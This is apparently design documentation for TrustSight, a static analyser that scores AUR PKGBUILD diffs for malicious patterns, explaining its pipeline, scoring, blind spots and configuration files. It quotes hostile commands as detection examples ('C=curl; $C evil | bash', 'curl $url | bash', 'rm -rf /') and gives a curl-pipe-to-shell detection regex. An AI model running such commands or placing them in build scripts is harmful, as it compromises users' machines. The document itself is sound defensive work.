<!-- description: Why TrustSight is a static analysis tool by design, what that means in practice, and how to customize the detection surface without touching source code. -->

# Why Static Analysis

TrustSight is a **Static Application Security Testing** (SAST) tool, purpose-built for Arch Linux AUR PKGBUILDs. This page explains why it was designed this way, how the pipeline works, what static analysis can and cannot see, and how you can tune the detection surface.

## Why static analysis

A PKGBUILD is a recipe, not a binary. It declares what the build will fetch, how it will compile, and what it will install. That text is available before `makepkg` runs, which means you can audit it before you build.

The AUR is an unmoderated, user-submitted repository. Anyone can publish, and whoever maintains a package can modify it at will. The strongest realistic adversary controls every byte of every artifact TrustSight reads about a package, and knows the source code. In that environment, TrustSight chose static analysis for four reasons:

1. **It runs before `makepkg`.** The whole point is to decide whether to build. Running the PKGBUILD to inspect it would defeat the purpose: a malicious PKGBUILD could detect execution and behave differently, or perform harmful actions during the attempted resolution.
2. **It is deterministic.** The same diff, against the same stored history, always produces the same score and the same evidence record. There is no randomness, no remote service, and no model in the loop. (See [Security Model](../security.md) for the full invariant.)
3. **It scales.** Analysing 50 packages in a review takes seconds, not minutes. No chroot, no root, no sandbox setup.
4. **It does not modify your system.** TrustSight never runs `makepkg`, never fetches a URL a package declares, and never extracts an archive to disk. Every finding is traceable to a specific diff line, URL, or novelty record. There is no SSRF primitive to turn a reviewer into a probe.

The tradeoff is honest: static analysis cannot observe runtime behaviour. TrustSight's [W-series rules](../reference/rules/unverifiable.md) (W001-W006) flag cases where code runs and the analysis could not read it, marking the result as having a coverage gap rather than pretending the surface was covered. See [What TrustSight Cannot See](what-trustsight-cannot-see.md) for the full ceiling.

## What SAST means here

TrustSight reads the PKGBUILD and its companion files (`.install` hooks, committed Makefiles, and other AUR repository content). It then walks a five-stage pipeline:

1. **Parse** the PKGBUILD into a structured representation.
2. **Analyse** it against pattern rules and context signals.
3. **Score** the findings through an additive model.
4. **Classify** the result into a risk band.
5. **Report** the findings through a template.

Every step is local and deterministic. No PKGBUILD is executed. No URL is fetched. No archive is extracted. The tool reads, computes, and reports. That is all.

### 1. Parse

The PKGBUILD is a shell script with named variables, arrays, function calls, and conditional expressions. The parser resolves variable references in `source`, `sha256sums`, `pkgver`, `pkgrel`, and the `package()` function to produce a structured representation.

Resolution is partial by design. PKGBUILDs are not executed, so the parser can only resolve what is statically determinable:

- Simple variable references (`$pkgname`, `${pkgver}`) are resolved.
- Function calls (`pkgver() { ... }`) are parsed for structure but not executed.
- Conditional branches (`if [[ ... ]]`) are noted but not taken.
- Dynamically constructed strings (command substitution, arithmetic expansion) are marked as unresolvable.

When a `source=` entry is computed at build time (a command substitution, not a variable the tokenizer can expand), the URL the build will actually fetch is not in the analysed text. The pipeline records this as the `unresolved_source` coverage gap, and a coverage gap forbids an UNFLAGGED verdict: the result is reported as `Inconclusive` rather than guessing.

The tokenizer also resolves shell variables so that a payload assembled from `C=curl; $C evil | bash` still reaches the rules. Resolution is bounded: `_MAX_EXPANSION_PASSES` (16 rewrites), `_MAX_VALUE_LEN` (8 KiB per value), `_MAX_LINE_LEN` (64 KiB per resolved line), and `_MAX_TABLE_BYTES` (1 MiB for the variable table). A value that would exceed the bound is left unexpanded and never truncated, because a truncated value would look like a fully resolved string with its tail quietly removed. Indirect expansion (`${!name}`) and length (`${#name}`) are never resolved; both return unresolved rather than a guess.

### 2. Analyse

The analysis stage extracts four categories of signal from the parsed PKGBUILD:

**Structural signals (Tier A)** come from rule matching. Two match targets exist because PKGBUILDs have two surfaces:

- **Resolved strings** are the post-resolution values of variables and function bodies. Rules matched against resolved strings (R001, R002, R003, R008, R012) catch patterns that survive variable resolution. For example, `curl $url | bash` is detected in the resolved string after `$url` is expanded, not in the raw diff line where the actual URL is hidden behind a variable.
- **Raw diff lines** are the literal lines changed in the diff, with the `+`/`-` prefix stripped. Rules matched against raw lines (H001, H002, R007, H004, R010, R011, R013) catch patterns in the PKGBUILD text itself: a `sha256sums=('SKIP')` declaration, a `sudo` command, a unicode bidi override character.

Scope constraints further refine matching. R010 (curl) and R011 (wget) are restricted to `function_body` context to avoid firing on top-level variable assignments or informational messages. This was a direct result of corpus analysis: these patterns in comments or messages were high-frequency false positives, while the uses worth reporting occur inside build functions.

**Context signals (Tier B)** classify every new source URL by domain. Classification is deterministic: static configured lists and the homograph check assign each URL to `trusted_forge`, `official`, `raw_hosting`, `unknown`, or `homograph_attack`. No network calls are made at analysis time.

**History signals (Tier C)** compare new URLs and maintainers against the local database. A URL that has never been observed before in any package is globally novel; one never seen for this specific package is locally novel. Novelty is definitionally meaningless on first run, so its contribution is maturity-gated: it phases in linearly as observations accumulate, reaching full weight at 50 observations.

**Verification signals (Tier D)** inspect the statically visible post-diff PKGBUILD text for cryptographic metadata: checksum arrays, PGP key declarations, and GPG verify calls. They are declarations, not database-backed or remote verification: TrustSight does not establish that the declared protection is valid. Everything the tool sees is attacker-declared, and it never fetches, so it cannot confirm that a declared key signs anything. These signals are reported at weight 0.

Rule patterns are regexes running over attacker-written text, so the input is clamped to 8 KiB per line before matching. A diff containing any over-length line records the `line_truncated` coverage gap, which forbids an UNFLAGGED result. The diff itself is capped at a configured byte limit (default 5 MiB); reaching it records `diff_truncated`.

### 3. Score

The score is a single integer from 0 to 100 computed from all signals. The calculation is **purely additive**: nothing lowers a score.

Each severity level carries a weight reflecting its information value:

| Severity | Weight | Meaning |
|----------|--------|---------|
| FATAL | 0 (hard-stop at 100) | Active deception of the reviewer (R012, R013) |
| CRITICAL | 40 | Almost certainly malicious if triggered |
| HIGH | 25 | Strong signal |
| MEDIUM | 15 | Notable but not definitive |
| LOW | 5 | Weak signal, context-dependent |
| INFO | 0 | Recorded for audit only |

FATAL rules (R012, R013) short-circuit scoring. When a FATAL rule fires, the score is immediately set to 100 regardless of any other signal. A CRITICAL finding floors the risk band at High: a lone fork bomb or `rm -rf /` would otherwise read as Medium on arithmetic that says nothing about severity.

Source bucket modifiers adjust for domain trustworthiness: `unknown` adds 20, `homograph_attack` adds 30, `trusted_forge` and `official` add 0. Novelty weights add to the score when maturity allows: `url_first_globally` adds 10, `url_first_in_package` adds 5, `maintainer_first` adds 15, each scaled by `min(1, observations/50)`.

The final score is clamped to 0 to 100. A package with checksums, a trusted forge source, and no rule firings scores 0.

### 4. Classify

The score maps to a verdict class:

| Score range | Verdict | Meaning |
|-------------|---------|---------|
| 0 to 20 | UNFLAGGED | No actionable signals detected, and the analysis was complete |
| 21+ | FLAGGED | Signals warrant review before updating |
| Any | INCONCLUSIVE | A cold database, or an analysis that could not examine the whole change |

INCONCLUSIVE is triggered by exactly two things: a coverage gap (the diff was truncated, a line was longer than the matching limit, or a `source=` entry is computed at build time), or a cold database (a Medium-band score held up entirely by novelty, with fewer than 25 recorded analyses). A HIGH, CRITICAL, or FATAL finding is never downgraded this way.

### 5. Translate

The score, evidence breakdown, and verification metadata are rendered into a structured report. All output is deterministic and generated locally from the computed data. No language model renders a verdict; rendering is a security property, not a stylistic one.

## What static analysis cannot see

Static analysis has a reasoned ceiling. These are not bugs; they are inherent limits of auditing PKGBUILD metadata rather than build artifacts.

### The upstream-payload gap

A PKGBUILD is a recipe, not a meal. A signed, version-bumped PKGBUILD with a checksum that matches a backdoored tarball is invisible to this tool. The audit checks the recipe, not the cooked meal. TrustSight can tell you that the recipe looks normal; it cannot tell you that the tarball at the other end of that checksum is safe.

A checksum, a commit, a submodule gitlink, and a committed binary's blob id all name content the analysis never reads. A change to one of them, with no corresponding version change, is the observable form of "the code was replaced". H033 applies this to a git ref and C001 to a checksum. What remains genuinely invisible is a first analysis (which has no previous identity to compare against) and a legitimate upstream release that happens to contain a payload.

### The parser boundary

Not all PKGBUILD structure is resolvable without execution. Unresolvable variable references, conditional expressions that determine command execution, dynamically constructed command strings, and loop-generated sources are all beyond static resolution. Where this affects a `source=` entry, the pipeline records the `unresolved_source` coverage gap and the run is reported as `Inconclusive`.

### Deliberately-unremarkable PKGBUILDs

A malicious PKGBUILD that contains no detectable patterns (no `curl`, no `base64`, no checksum changes, no new URLs, no untrusted source buckets) will score 0. The tool detects patterns associated with compromise, not compromise itself. TrustSight mitigates this through novelty signals (Tier C catches patterns the rules do not anticipate), the additive scoring model (low scores still warrant review), and deterministic verdicts (every triggered signal is described). None of these eliminate the problem.

### The novelty ceiling

The ruleset detects known patterns and reuse: commands, hosts, checksums, maintainers, and dependency names that match a documented signature or have been observed before. An attacker with fresh infrastructure and no known pattern is not caught by most rules.

For the full list of limitations, see [What TrustSight Cannot See](what-trustsight-cannot-see.md).

## Customization

TrustSight's entire detection surface is configurable through files in `~/.config/trustsight/`, without touching source code. The files are written on first run and never rewritten, so an edited file is always kept. A `trustsight config sync-rules` command brings a stale `rules.toml` in line with the shipped defaults.

### rules.toml

The primary tuning surface. Contains 32 R-series regex rules, each with an `id`, `name`, `pattern`, `severity`, `category`, and `match_target`. You can change the pattern, severity, weight, or disable any of them.

```toml
[[rules]]
id = "R001"
name = "Remote Script Execution"
pattern = 'curl.*(?<!\\)\\|\\s*(?:bash|sh|zsh|ksh|fish)'
severity = "CRITICAL"
category = "network_execution"
match_target = "resolved"
```

R-series rules are regex-based and match against resolved strings or raw diff lines. H-series heuristics (97 rules) are emitted from code because they need diff context a single-line regex cannot see (for example, "did the build function change between two commits?", or "did the build function gain a network client?"). Their severities and weights are adjustable through `thresholds.toml` and `config.toml`.

C-series rules (C001-C009) enforce structural invariants that depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). They are hard-coded because writing them as TOML patterns would require embedding logic in regex.

S-series sabotage rules (S001-S008) use command-position matching to distinguish build-sandbox cleanup from system damage: `rm -rf "$srcdir/x"` is housekeeping, `rm -rf /` is not.

X-series crossfire rules (X001-X025) are anti-evasion rules that detect patterns designed to exploit the analysis itself.

Two families report at weight 0 and never score: declared-practice findings (P001-P008) and [unverifiable findings (W001-W006)](../reference/rules/unverifiable.md), the latter naming what an analysis could not read.

For the full rule catalog, see [Rules Reference](../reference/rules/index.md).

### config.toml

Controls weights, limits, review profiles, and per-rule overrides.

**`[severity_weights]`** maps each severity level to its numeric contribution to the base score. FATAL rules hard-stop at 100; their weight is not used.

```toml
[severity_weights]
FATAL = 0
CRITICAL = 40
HIGH = 25
MEDIUM = 15
LOW = 5
INFO = 0
```

**`[review]`** selects a profile and its flagging threshold. Three profiles ship: `default` (threshold 20, about 13% of benign diffs enter the review queue), `quiet` (threshold 40, smaller queue), and `strict` (threshold 10, broader queue for operators who prefer sensitivity). Changing a profile does not change a score, risk band, or calibration result; it changes only the reports marked for review.

```toml
[review]
profile = "default"
```

**`[rules.R###]`** provides per-rule `enabled` and `weight_override` for any R-series rule. A FATAL rule cannot be disabled.

```toml
[rules.R007]
enabled = false
weight_override = 15
```

**`[depth]`** controls how far into AUR dependency closures to analyse. `0` disables it, `1` (the default) analyses direct AUR dependencies, `n` analyses n levels, and `-1` walks every level up to the hard ceilings (8 levels, 200 dependencies per run).

```toml
[depth]
levels = 1
```

**`[diff]`** sets byte caps for diffs. The default `max_diff_bytes` is 5 MiB; a larger diff sets the `diff_truncated` coverage gap.

**`[experimental_rules]`** enables or disables code-emitted rules that default to `true` after corpus calibration: D001 (novel dependency name), D002 (dependency typo), D003 (network-capable makedepends), D004 (unrelated provides/replaces), H015-H019, and others.

### overrides.json

Suppress a specific finding for a specific package. Managed through the `trustsight override` command:

```bash
trustsight override add R001 some-package "Legitimately bootstraps its own installer"
trustsight override list
trustsight override remove R001 some-package
```

A FATAL finding (R012, R013) cannot be overridden. Suppressed findings are always visible in the output as non-scoring audit data; a silent suppression is indistinguishable from a missed one.

### thresholds.toml

Tuning knobs for H-series heuristics and longitudinal signals. Each key controls a threshold that a code-emitted rule reads at analysis time:

| Key | Rule | Default | Meaning |
|-----|------|---------|---------|
| `h036.obfuscation_density` | H036 | 3 | Distinct obfuscation indicators on one line before reporting |
| `h043.attack_chain_stages` | H043 | 3 | Kill-chain stages that must co-occur |
| `h045.min_packages` / `h045.window_days` | H045 | 10 / 7 | Cluster size and window for mass adoption detection |
| `h052.min_packages` | H052 | 3 | Unrelated packages that must share a source repository |
| `h055.min_packages` / `h055.window_hours` | H055 | 5 / 24 | Cluster size and window for an attribute burst |
| `h057.min_hops` / `h060.min_hops` | H057, H060 | 2 | Hops that make an exposure transitive rather than direct |
| `h058.min_history_cycles` / `h058.z_score` / `h058.min_activity` | H058 | 3 / 2.0 / 3 | Baseline length, deviation, and floor for maintainer activity |
| `h061.min_dependents` | H061 | 50 | Dependents that make a package a hub |
| `h073.min_history_cycles` / `h073.z_score` / `h073.min_introduced` | H073 | 3 / 3.0 / 3 | Baseline length, deviation, and floor for corpus introduction rate |
| `h064.widely_provided_observations` | H064 | 25 | Observations that make a provided name widely provided |
| `h074.window_days` | H074 | 14 | How recent the modification must be after an adoption |
| `longitudinal.stability_floor` | Class C | 10 | Consecutive observations a property must hold before a change is reported |

### hosts.toml

Lists that rules match against. Each list is consumed directly by its named rule:

| Key | Rules | Contents |
|-----|-------|----------|
| `paste_hosts` | H041, source buckets | Paste and ephemeral file-drop hosts. As `source=` URLs they are weighted by the `raw_hosting` bucket; as upload destinations inside a function they trigger H041. |
| `standard_ports` | R047 | Ports a build may legitimately contact. An HTTP URL to a non-standard port triggers R047 unless the port is in this list. |
| `free_registrar_tlds` | R048 | TLDs available at no cost, where a throwaway domain is cheap. |
| `source_schemes` | H034 | Allowlisted `source=` schemes. The base of a `transport+base` token is judged, so `git+https` reads as `https`. |
| `confusable_domains` | R013b | Popular domains a homoglyph label is tested against. A mixed-script label that resembles none of them stays quiet. |
| `covert_egress_endpoints` | H071 | DNS-over-HTTPS endpoints. |
| `covert_egress_clients` | H071 | Tunnelling and proxy clients, matched only at a command position. |

For overlapping settings, `hosts.toml` has precedence: `standard_ports` overrides `[ports] standard` in `config.toml`, and `free_registrar_tlds` overrides `[domains] free_registrar_tlds`. An empty sibling list falls back to the corresponding `config.toml` value and then the shipped default.

### patterns.toml

Pattern lists for specific rules:

| Key | Rules | Contents |
|-----|-------|----------|
| `foreign_pkg_managers` | H035 | Package managers that are not pacman. |
| `obfuscation_indicators` | H036 | Per-line obfuscation markers, counted against a density threshold. |
| `anti_analysis_probes` | H067 | Debugger, VM, sandbox, and CI probes. |
| `recon_commands` | H040 | Host-profiling commands, command-position anchored. |
| `parse_time_fetch` | H077 | Network clients whose invocation outside every function runs when the recipe is sourced. |
| `upload_flags` | H041 | `curl`/`wget` flags that send a request body (separating an upload from a download). |
| `network_tools` | D003 | Package names that grant a build network access. |
| `security_relevant_flags` | H047, H079 | Hardening flags whose appearance or disappearance changes the mitigation set. |
| `security_relevant_libraries` | H048 | Libraries whose vendoring bypasses distribution security updates. |

### naming.toml

Ecosystem prefixes (D004, H064) and variant suffixes (D002, H029, H052, H053). These decide when two package names belong to the same project, which is what keeps a package claiming its own project's names from firing a scope-expansion rule. For example, `htop-vim` providing `htop` does not fire D004 because the suffix identifies it as a variant.

### trusted_domains.toml

Domain classification lists for source bucket assignment: `trusted_forges` (github.com, gitlab.com, codeberg.org, bitbucket.org), `official_projects` (downloads.apache.org, nginx.org, kernel.org, and others), and additional categories. A URL's bucket determines its score modifier: `trusted_forge` and `official` add 0, `raw_hosting` adds 15, `unknown` adds 20, `homograph_attack` adds 30.

### iocs.toml

A versioned indicator list of known-bad package names, domains, and artifact hashes, each with provenance and a confidence tier. Ships empty. The confidence tier decides severity: `confirmed` is FATAL, `high` is CRITICAL, `medium` is HIGH. Matches are reported on `PackageFact.ioc_matches`, never in `score_breakdown`; they do not change the score or risk band. An expired indicator is reported as expired rather than silently dropped.

---

For the full configuration reference, see [Configuration](../reference/configuration.md). For the scoring model, see [Scoring Philosophy](scoring-philosophy.md). For the security invariants, see [Security Model](../security.md).
